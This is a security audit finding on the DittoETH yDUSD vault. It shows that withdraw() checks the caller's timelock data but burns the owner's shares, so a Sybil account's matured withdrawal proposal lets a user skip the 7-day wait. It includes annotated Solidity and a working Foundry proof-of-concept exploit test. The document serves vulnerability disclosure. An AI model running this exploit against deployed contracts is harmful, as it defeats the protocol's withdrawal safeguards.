## [M] Users can evade the `yDUSD` vault's withdrawal timelock mechanism

### Summary

The `yDUSD` vault's withdrawal timelock mechanism is vulnerable. An exploiter can withdraw the `DUSD` assets in their account by using another account's `proposedWithdraw` request info, breaking the vault's core invariant.

### Description

Assuming Bob is an exploiter, he can evade his account (i.e., `owner`) from the `yDUSD` vault's withdrawal timelock mechanism by using [the `proposeWithdraw` request info of another account (i.e., `msg.sender`)](repos/2024-07-dittoeth/contracts/tokens/yDUSD.sol#L85) (`@1` in the snippet below), which can be requested beforehand.

This way, he can withdraw his `DUSD` assets in the `owner` account from the vault without waiting for the 7-day period, breaking the invariant of the vault's timelock mechanism.

With the `msg.sender`'s `proposeWithdraw`request info, the [7-day timelock period check](repos/2024-07-dittoeth/contracts/tokens/yDUSD.sol#L91) (`@2`) can be passed. After passing the withdrawal timelock check in `@2`, the [`DUSD` assets in the `owner` account](repos/2024-07-dittoeth/contracts/tokens/yDUSD.sol#L107) (`@3`) can be withdrawn without invoking the `yDUSD::proposeWithdraw()`.

```solidity
    function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256) {
        //@audit @1 -- Bob can evade his account (i.e., owner) from the vault's withdrawal timelock mechanism by using
        //             the proposeWithdraw info of another account (i.e., msg.sender), which can be requested beforehand.
        //
        //             This way, he can withdraw his DUSD assets in the 'owner' account from the vault without 
        //             waiting for the 7-day period, breaking the invariant of the vault's timelock mechanism.
@1      WithdrawStruct storage withdrawal = withdrawals[msg.sender];
        uint256 amountProposed = withdrawal.amountProposed;
        uint256 timeProposed = withdrawal.timeProposed;

        if (timeProposed == 0 && amountProposed <= 1) revert Errors.ERC4626ProposeWithdrawFirst();

        //@audit @2 -- With the msg.sender's proposeWithdraw request info, the 7-day timelock period check can be passed.
@2      if (timeProposed + C.WITHDRAW_WAIT_TIME > uint40(block.timestamp)) revert Errors.ERC4626WaitLongerBeforeWithdrawing();

        // @dev After 7 days from proposing, a user has 45 days to withdraw
        // @dev User will need to cancelWithdrawProposal() and proposeWithdraw() again
        if (timeProposed + C.WITHDRAW_WAIT_TIME + C.MAX_WITHDRAW_TIME <= uint40(block.timestamp)) {
            revert Errors.ERC4626MaxWithdrawTimeHasElapsed();
        }

        if (amountProposed > maxWithdraw(owner)) revert Errors.ERC4626WithdrawMoreThanMax();

        checkDiscountWindow();

        uint256 shares = previewWithdraw(amountProposed);

        IAsset _dusd = IAsset(dusd);
        uint256 oldBalance = _dusd.balanceOf(receiver);
        //@audit @3 -- After passing the timelock check in @2, the DUSD assets in Bob's owner account can be withdrawn 
        //             without invoking the proposeWithdraw().
@3      _withdraw(_msgSender(), receiver, owner, amountProposed, shares);
        uint256 newBalance = _dusd.balanceOf(receiver);

        // @dev Slippage is likely irrelevant for this. Merely for preventative purposes
        uint256 slippage = 0.01 ether;
        if (newBalance < slippage.mul(amountProposed) + oldBalance) revert Errors.ERC4626WithdrawSlippageExceeded();

        delete withdrawal.timeProposed;
        //reset withdrawal (1 to keep slot warm)
        withdrawal.amountProposed = 1;

        return shares;
    }
```

To exploit the vulnerability, Bob must approve [the shares transfer of the `owner` account](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L237-L239) (`@3.1` in the snippet below) for the `withdrawer` account (i.e., `msg.sender`).

After `@3.1`, the `ERC4626::_withdraw()` will burn the [shares from the `owner` account](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L247) (`@3.2`), and then the [`DUSD` assets in the `owner` account](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L248) (`@3.3`) will eventually be transferred out.

```solidity
        // FILE: node_modules/@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol
        function _withdraw(
            address caller,
            address receiver,
            address owner,
            uint256 assets,
            uint256 shares
        ) internal virtual {
            //@audit @3.1 -- To exploit the vulnerability, Bob must approve the shares transfer of the 'owner' account 
            //               for the withdrawer account (i.e., msg.sender).
@3.1        if (caller != owner) {
@3.1            _spendAllowance(owner, caller, shares);
@3.1        }

            // If _asset is ERC777, `transfer` can trigger a reentrancy AFTER the transfer happens through the
            // `tokensReceived` hook. On the other hand, the `tokensToSend` hook, that is triggered before the transfer,
            // calls the vault, which is assumed not malicious.
            //
            // Conclusion: we need to do the transfer after the burn so that any reentrancy would happen after the
            // shares are burned and after the assets are transferred, which is a valid state.

            //@audit @3.2 -- The _withdraw() will burn the shares from the 'owner' account.
@3.2        _burn(owner, shares);

            //@audit @3.3 -- Then, the DUSD assets in the 'owner' account will eventually be transferred out.
@3.3        SafeERC20.safeTransfer(_asset, receiver, assets);

            emit Withdraw(caller, receiver, owner, assets, shares);
        }

### Impact

Users can withdraw their `DUSD` assets from the `yDUSD` vault without waiting for the 7-day period, breaking the vault's timelock mechanism's invariant.

### Proof of Concept

This section provides a coded PoC.

Place the `test_PoC_yDUSD_Vault_BreakingWithdrawalInvariant()` in the `.test/YDUSD.t.sol` file and declare the following `import` directive at the top of the test file: `import {IyDUSD} from "interfaces/IyDUSD.sol";`.

To run the test, execute the command: `forge test -vv --mt test_PoC_yDUSD_Vault_BreakingWithdrawalInvariant`.

The PoC shows that an exploiter can withdraw their `DUSD` assets in the `sender` account using another withdrawer account, i.e., the `receiver` account, without waiting for the 7-day period.

```solidity
function test_PoC_yDUSD_Vault_BreakingWithdrawalInvariant() public {
    // Require: import {IyDUSD} from "interfaces/IyDUSD.sol";

    // ----- Setup PoC -----
    // Mint dusd to sender
    vm.prank(_diamond);
    token.mint(sender, DEFAULT_AMOUNT);

    // Match at oracle
    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, extra);
    fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, extra);

    skip(C.DISCOUNT_WAIT_TIME);
    // ----- Setup PoC -----

    // Receiver deposits DUSD into the vault to get yDUSD
    vm.prank(receiver);
    rebasingToken.deposit(DEFAULT_AMOUNT, receiver);

    // Receiver proposes for withdrawal
    vm.prank(receiver);
    rebasingToken.proposeWithdraw(DEFAULT_AMOUNT);

    // Skip 7 days to avoid the ERC4626WaitLongerBeforeWithdrawing error
    skip(7 days);

    // Sender deposits DUSD into the vault to get yDUSD
    vm.prank(sender);
    rebasingToken.deposit(DEFAULT_AMOUNT, sender);

    // To exploit the vulnerability, perform the following steps:
    //
    // 1. Sender approves shares transfer for Receiver (another Sybil account)
    vm.prank(sender);
    IyDUSD(_yDUSD).approve(receiver, type(uint256).max); // Require: import {IyDUSD} from "interfaces/IyDUSD.sol";

    // 2. Sender withdraws DUSD assets from his account using Receiver's proposed info
    //
    // As a result, Sender neither needs to execute the proposeWithdraw() nor wait for any second to withdraw his assets
    vm.prank(receiver);
    rebasingToken.withdraw(0 /* unused */, sender /* receiver */, sender /* owner */); // Use Receiver's proposed info
}
```
